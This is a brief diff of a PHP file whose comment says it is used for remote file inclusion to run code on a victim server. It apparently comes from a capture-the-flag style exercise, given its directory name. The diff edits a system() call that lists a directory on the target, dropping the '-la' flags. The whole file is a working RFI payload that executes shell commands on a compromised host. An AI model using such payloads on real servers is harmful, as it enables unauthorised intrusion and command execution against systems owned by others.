@@ -1,4 +1,4 @@
 <?php
 // This file is used for rfi to run code on the victim server
-system('ls -la i_wonder_whats_in_here');
+system('ls i_wonder_whats_in_here');
 ?>
